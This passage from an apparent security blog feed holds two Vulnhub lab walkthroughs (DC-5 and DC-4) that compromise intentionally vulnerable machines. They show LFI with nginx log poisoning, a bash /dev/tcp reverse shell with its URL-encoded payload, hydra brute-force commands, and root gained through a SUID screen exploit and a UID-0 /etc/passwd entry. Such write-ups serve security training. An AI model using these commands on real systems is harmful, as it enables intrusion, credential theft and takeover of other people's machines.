+
+<p>Let’s inspect this URL more closely to understand and find out if there is any way to get in. After analyzing the URL, I didn’t find any vulnerability with any of the parameters. Since it’s an intentionally vulnerable box, there is a high possibility of having a vulnerability. However, I have not tried parameter finding yet. So, let’s check if there is any hidden parameter for the back-end. For this task, I would like to use WFUZZ tools.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt <span class="nt">--hc</span> 404 <span class="nt">--hh</span> 851 <span class="s2">"</span><span class="nv">$URL</span><span class="s2">”
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                    
+=====================================================================
+000002206:   200        42 L     63 W       835 Ch      "</span>file<span class="s2">"
+</span></code></pre></div></div>
+
+<p>There is a hidden parameter called <code class="language-plaintext highlighter-rouge">file</code>, acting like a light in the darkness. I decided to try viewing the /etc/passwd file, and it worked.</p>
+
+<p><img src="/assets/images/dc-5/3.png" alt="" /></p>
+
+<p>Now that we have LFI, allowing us to read files, we need to confirm the extent of this vulnerability. If we can only read the data, that’s helpful, but if we can also execute files, we might gain control of the system. Let’s first confirm the capability. I’ll attempt to call the index file. If we receive back the raw code, it means we can only read the code. If we see the furnished web application, it indicates code execution as well.</p>
+
+<p><img src="/assets/images/dc-5/4.png" alt="" /></p>
+
+<p>As we can see from the furnished output, it’s confirmed that the LFI also has the capability to execute the code. Now, we need to find a way to gain access to the system using this LFI vulnerability. I would like to check all the files accessible through this LFI vulnerability, so I’ll run wfuzz again.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt <span class="nt">--hc</span> 404 <span class="nt">--hh</span> 835 <span class="s2">"</span><span class="nv">$URL</span><span class="s2">”
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                    
+=====================================================================                          
+000000124:   200        58 L     152 W      1546 Ch     "</span>/etc/apt/sources.list<span class="s2">"                                                                                    
+000000116:   200        263 L    1162 W     7950 Ch     "</span>/etc/apache2/apache2.conf<span class="s2">"                                                                                
+000000133:   200        96 L     117 W      1558 Ch     "</span>/etc/group<span class="s2">"                                                                                               
+000000130:   200        54 L     151 W      1499 Ch     "</span>/etc/fstab<span class="s2">"                                                                                               
+000000203:   200        52 L     120 W      1246 Ch     "</span>/etc/hosts.allow<span class="s2">"                                                                                         
+000000204:   200        59 L     174 W      1546 Ch     "</span>/etc/hosts.deny<span class="s2">"                                                              
+000000126:   200        57 L     187 W      1557 Ch     "</span>/etc/crontab<span class="s2">"                                                                                             
+000000200:   200        49 L     85 W       1019 Ch     "</span>/etc/hosts<span class="s2">"                                    
+000000252:   200        70 L     104 W      2319 Ch     "</span>/etc/passwd<span class="s2">"                                      
+000000245:   200        62 L     124 W      1332 Ch     "</span>/etc/nsswitch.conf<span class="s2">"                                
+000000244:   200        61 L     166 W      1602 Ch     "</span>/etc/netconfig<span class="s2">"                                                                                           
+000000241:   200        49 L     103 W      1121 Ch     "</span>/etc/motd<span class="s2">"                                                                                                
+000000243:   200        170 L    590 W      4368 Ch     "</span>/etc/mysql/my.cnf<span class="s2">"                                                                                        
+000000232:   200        44 L     68 W       861 Ch      "</span>/etc/issue<span class="s2">"                                                                                               
+000000231:   200        466 L    1334 W     11019 Ch    "</span>/etc/init.d/apache2<span class="s2">"                  
+000000394:   200        45 L     69 W       898 Ch      "</span>/etc/resolv.conf<span class="s2">"                                                                                         
+000000395:   200        82 L     180 W      1722 Ch     "</span>/etc/rpc<span class="s2">"                                                                                                 
+000000422:   200        46 L     98 W       1114 Ch     "</span>/etc/updatedb.conf<span class="s2">"                                                                                       
+000000417:   200        130 L    376 W      3376 Ch     "</span>/etc/ssh/sshd_config<span class="s2">"                                                                                     
+000000492:   200        68 L     230 W      1778 Ch     "</span>/proc/cpuinfo<span class="s2">"                                                                                            
+000000500:   200        64 L     402 W      4135 Ch     "</span>/proc/net/tcp<span class="s2">"                                                                                            
+000000505:   200        43 L     78 W       972 Ch      "</span>/proc/version<span class="s2">"                                                                                            
+000000504:   200        83 L     164 W      1620 Ch     "</span>/proc/self/status<span class="s2">"                                                                                        
+000000501:   200        49 L     87 W       1011 Ch     "</span>/proc/partitions<span class="s2">"                                                                                         
+000000502:   200        42 L     66 W       908 Ch      "</span>/proc/self/cmdline<span class="s2">"                                                                                       
+000000498:   200        46 L     117 W      1281 Ch     "</span>/proc/net/dev<span class="s2">"                                                                                            
+000000499:   200        45 L     96 W       1219 Ch     "</span>/proc/net/route<span class="s2">"                                                                                          
+000000497:   200        46 L     90 W       1145 Ch     "</span>/proc/net/arp<span class="s2">"                                                                                            
+000000494:   200        43 L     68 W       861 Ch      "</span>/proc/loadavg<span class="s2">"                                                                                            
+000000496:   200        67 L     213 W      2603 Ch     "</span>/proc/mounts<span class="s2">"                                                                                             
+000000495:   200        86 L     191 W      2061 Ch     "</span>/proc/meminfo<span class="s2">"                                                                                            
+000000493:   200        104 L    379 W      3735 Ch     "</span>/proc/interrupts<span class="s2">"
+000000693:   200        47 L     69 W       293123 Ch   "</span>var/log/nginx/access.log<span class="s2">"                                 
+000000694:   200        42 L     68 W       293123 Ch   "</span>/var/log/lastlog<span class="s2">"                                                                                         
+000000736:   200        46 L     88 W       13877 Ch    "</span>/var/log/wtmp<span class="s2">"                                                                                            
+000000745:   200        44 L     70 W       1987 Ch     "</span>/var/run/utmp<span class="s2">"                                                                                            
+</span></code></pre></div></div>
+
+<p>We now have access to all these important files on this machine. One of the most interesting files is var/log/nginx/access.log. This file stores all the requests made to the server, along with the corresponding URLs. At this point, my idea is to attempt log poisoning. If we make a request with PHP code inside the URL, the response will be 404, but the PHP code will be present in the log file. As we observed earlier, the LFI also executes code. Therefore, when we access the file during the execution process, the code will be executed.</p>
+
+<p><img src="/assets/images/dc-5/5.png" alt="" /></p>
+
+<p>We wrote a command injection vulnerable code that will be stored inside the log file. During the opening of the file, we should get command execution. Now, let’s verify the command injection.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="o">[</span>http://192.168.197.133/thankyou.php?file<span class="o">=</span>/var/log/nginx/access.log&amp;cmd<span class="o">=</span>ping]<span class="o">(</span>http://192.168.197.133/thankyou.php?file<span class="o">=</span>/var/log/nginx/access.log&amp;cmd<span class="o">=</span>ping<span class="o">)</span> 192.168.197.131
+</code></pre></div></div>
+
+<p>We made a curl request with our desired URL. Here, ‘file=/var/log/nginx/access.log’ reads the log file, and ‘cmd=ping 192.168.197.131’ is the command for pinging my local machine, which will verify the command injection. To confirm, we can run a listener on our attack box.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> eth0 <span class="nt">-c5</span> icmp
+
+Response
+tcpdump: verbose output suppressed, use <span class="nt">-v</span><span class="o">[</span>v]... <span class="k">for </span>full protocol decode
+listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, snapshot length 262144 bytes
+03:49:14.643611 IP 192.168.197.133 <span class="o">&gt;</span> 192.168.197.131: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>1799, <span class="nb">seq </span>9817, length 64
+03:49:14.643690 IP 192.168.197.131 <span class="o">&gt;</span> 192.168.197.133: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>1799, <span class="nb">seq </span>9817, length 64
+03:49:15.285594 IP 192.168.197.133 <span class="o">&gt;</span> 192.168.197.131: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>2258, <span class="nb">seq </span>400, length 64
+03:49:15.285628 IP 192.168.197.131 <span class="o">&gt;</span> 192.168.197.133: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>2258, <span class="nb">seq </span>400, length 64
+03:49:15.645248 IP 192.168.197.133 <span class="o">&gt;</span> 192.168.197.131: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>1799, <span class="nb">seq </span>9818, length 64
+5 packets captured
+6 packets received by filter
+0 packets dropped by kernel
+</code></pre></div></div>
+
+<p>We received an ICMP request back, which means the command execution was successful. Now, we can attempt to establish a reverse shell.</p>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+
+<p>Here, we use a one-liner bash reverse shell. We need to encode the shell into URL encoding format to avoid bad characters since we are using a browser.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Reverse shell
+bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/192.168.197.131/9001 0&gt;&amp;1'</span>
+
+Full Payload
+<span class="o">[</span>http://192.168.197.133/thankyou.php?file<span class="o">=</span>/var/log/nginx/access.log&amp;cmd<span class="o">=</span>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;%26 %2Fdev%2Ftcp%2F192.168.197.131%2F9001 0&gt;%261'</span><span class="o">](</span>http://192.168.197.133/thankyou.php?file<span class="o">=</span>/var/log/nginx/access.log&amp;cmd<span class="o">=</span>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.197.131%2F9001%200%3E%261%27<span class="o">)</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/dc-5/6.png" alt="" /></p>
+
+<p>We obtained the reverse shell, successfully gaining the initial foothold.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>After obtaining the shell, I attempted to locate sensitive files, check privileges, and identify misconfigurations, but I did not find anything noteworthy. I then tried searching for GUIDs, but nothing interesting turned up. Finally, I explored SUID and discovered ‘screen 4.5.0,’ which seemed intriguing to me. I decided to investigate further.</p>
+
+<p><img src="/assets/images/dc-5/7.png" alt="" /></p>
+
+<p>From the exploitDB database i found privilege escalation script.</p>
+
+<p><img src="/assets/images/dc-5/8.png" alt="" /></p>
+
+<p>here i download the script using searchsploit kali linux builtin tools from exploit DB.</p>
+
+<p><img src="/assets/images/dc-5/9.png" alt="" /></p>
+
+<p>I start a python http server to transfer the payload to the victim machine.</p>
+
+<p><img src="/assets/images/dc-5/10.png" alt="" /></p>
+
+<p>from the victim machine i saw there is wget so its easier to download through wget.</p>
+
+<p><img src="/assets/images/dc-5/11.png" alt="" /></p>
+
+<p>Through wget i download the file to victim machine.</p>
+
+<p><img src="/assets/images/dc-5/12.png" alt="" /></p>
+
+<p>I made the file executable, ran it as is, and now I have root access.</p>
+
+<p><img src="/assets/images/dc-5/13.png" alt="" /></p>
+
+<p>The privilege escalation was quite easy. There wasn’t anything complex; I just needed to find the right payload, transfer it to the victim computer, make it executable, and execute it. The permissions were then changed to root.</p>]]></content><author><name>Raju Talukder</name></author><category term="DC-Series" /><summary type="html"><![CDATA[This box proved to be quite engaging for me. The initial foothold presented an interesting challenge. Understanding the application’s workflow and identifying a hidden parameter vulnerable to LFI with code execution capabilities was crucial. Since file uploads were not possible, I opted for a log poisoning attack to achieve command injection. This sequence, starting with log poisoning and leading to command injection, allowed for the initial foothold. The privilege escalation was straightforward, involving the exploitation of a SUID binary for which a publicly available exploit already exists.]]></summary></entry><entry><title type="html">Vulnhub DC-4 Walkthrough</title><link href="http://localhost:4000/dc-series/vulnhub-dc-4-walkthrough/" rel="alternate" type="text/html" title="Vulnhub DC-4 Walkthrough" /><published>2023-10-21T00:00:00+05:30</published><updated>2023-10-21T00:00:00+05:30</updated><id>http://localhost:4000/dc-series/vulnhub-dc-4-walkthrough</id><content type="html" xml:base="http://localhost:4000/dc-series/vulnhub-dc-4-walkthrough/"><![CDATA[<p>This box was so easy. There are only two ports open: SSH and the HTTP server. For the initial foothold, we need to attempt a brute force attack on the login form of the web application. After logging into the application, we can intercept the request and modify the commands. The lack of input validation will give us the command injection vulnerability, allowing us to gain the initial foothold into the box. The privilege escalation is also straightforward. We found a stored password list, and there was a valid password for one user, which allowed SSH login. Checking the mail revealed another user’s password who has some super permissions on a file editor. Using these super permissions, we can edit any file, leading to root access.</p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p22</span>,80 <span class="nt">-sC</span> <span class="nt">-sV</span> 192.168.197.136
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.15.10
+|_http-title: System Tools
+|_http-server-header: nginx/1.15.10
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>From the Nmap scan, I found only two open ports: SSH and the web server. Since there are no credentials, port 22 is not relevant for now. Let’s start hunting through the web server.</p>
+
+<p><strong>Manual Inspection</strong></p>
+
+<p><img src="/assets/images/dc-4/1.png" alt="" /></p>
+
+<p>There is also nothing except the login form. I tried SQL injection, but it did not work. Default passwords did not work, and username enumeration was not successful. So, I tried a brute-force attack with the default admin username, given that it’s a vulnerable box. If it were a real application, I don’t think this would have worked so far. We may need to create a different username and password list to run a more effective brute-force attack.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 192.168.197.136 http-post-form <span class="s1">'/login.php:username=^USER^&amp;password=^PASS^:S=command'</span>
+
+<span class="o">[</span>DATA] attacking http-post-form://192.168.197.136:80/login.php:username<span class="o">=</span>^USER^&amp;password<span class="o">=</span>^PASS^:S<span class="o">=</span><span class="nb">command</span>
+<span class="o">[</span>80][http-post-form] host: 192.168.197.136   login: admin   password: happy
+1 of 1 target successfully completed, 1 valid password found
+</code></pre></div></div>
+
+<p>I’m lucky enough for now, i got the password for the admin user.</p>
+
+<p><img src="/assets/images/dc-4/2.png" alt="" /></p>
+
+<p>There is nothing only command and logout option. So, i go for command.</p>
+
+<p><img src="/assets/images/dc-4/3.png" alt="" /></p>
+
+<p>There is some functionality to run system commands. I plan to intercept the request and try to modify the default command they send. If I can manage to send my own commands, I will find the command injection vulnerability.</p>
+
+<p><img src="/assets/images/dc-4/4.png" alt="" /></p>
+
+<p>They just send plain text commands here, and the server also accepts the modified commands. The command injection vulnerability is confirmed, and we can send a reverse shell command through this vulnerable parameter to get a reverse shell.</p>
+
+<h1 id="initial-foothold">Initial Foothold</h1>
+
+<p><img src="/assets/images/dc-4/5.png" alt="" /></p>
+
+<p>Earlier, I verified the command injection. Then I attempted a bash TCP one-line reverse shell, but it didn’t work for me. After searching for different ways to get a shell, I found that netcat is present inside the box. Now, it’s a piece of cake to get the initial foothold.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p><img src="/assets/images/dc-4/6.png" alt="" /></p>
+
+<p>After getting the shell as www-data, I searched for the real users on this machine and found 4 users, including root. So, I started looking for files inside the users’ directories.</p>
+
+<p><img src="/assets/images/dc-4/7.png" alt="" /></p>
+
+<p>All the users’ home directories were empty except for Jim’s. There is a directory called ‘backup’ and two files, ‘mbox,’ which is not readable as www-data. The ‘<a href="http://test.sh/">test.sh</a>’ file has full access, and it is an SUID file. I can abuse this file since I have write access to it. However, I saw a password file, and I have three valid users, so it’s better to run an SSH brute force attack now.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> old_password.bak 192.168.197.136 ssh
+
+<span class="o">[</span>STATUS] 120.33 tries/min, 361 tries <span class="k">in </span>00:03h, 397 to <span class="k">do in </span>00:04h, 14 active
+<span class="o">[</span>22][ssh] host: 192.168.197.136   login: jim   password: jibril04
+</code></pre></div></div>
+
+<p>SSH brute force successfully manage jim password. so now we can login through ssh as jim.</p>
+
+<p><img src="/assets/images/dc-4/8.png" alt="" /></p>
+
+<p>Now i’m jim through SSH.</p>
+
+<p><img src="/assets/images/dc-4/9.png" alt="" /></p>
+
+<p>Now I can read the ‘mbox’ file; it’s an email. Let’s visit the mail folder for more information. Here is an email from Charles regarding his password. So, now I have Charles’ password as well.</p>
+
+<p><img src="/assets/images/dc-4/10.png" alt="" /></p>
+
+<p>I can normally change the user as chales and i done it here.</p>
+
+<p><img src="/assets/images/dc-4/11.png" alt="" /></p>
+
+<p>Before doing anything, I want to check Charles’ sudo permissions here. I found he has sudo access with no password in the Teehee editor. So, as we have sudo access with a file editor, we can modify any file we want. The very easy way to get root is to add a user with UID and GID 0.</p>
+
+<p><img src="/assets/images/dc-4/12.png" alt="" /></p>
+
+<p>Here i add raaj user with UID and GI 0 means its root user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"raaj::0:0:::/bin/bash"</span> | <span class="nb">sudo </span>teehee <span class="nt">-a</span> /etc/passwd
+</code></pre></div></div>
+
+<p><img src="/assets/images/dc-4/13.png" alt="" /></p>
+
+<p>Now, just change the user to <code class="language-plaintext highlighter-rouge">raaj</code> and we are root because we set the UID and GID for the <code class="language-plaintext highlighter-rouge">raaj</code> user as 0. In the Linux file system, the UID and GID 0 are always reserved for the root.</p>]]></content><author><name>Raju Talukder</name></author><category term="DC-Series" /><summary type="html"><![CDATA[This box was so easy. There are only two ports open: SSH and the HTTP server. For the initial foothold, we need to attempt a brute force attack on the login form of the web application. After logging into the application, we can intercept the request and modify the commands. The lack of input validation will give us the command injection vulnerability, allowing us to gain the initial foothold into the box. The privilege escalation is also straightforward. We found a stored password list, and there was a valid password for one user, which allowed SSH login. Checking the mail revealed another user’s password who has some super permissions on a file editor. Using these super permissions, we can edit any file, leading to root access.]]></summary></entry></feed>
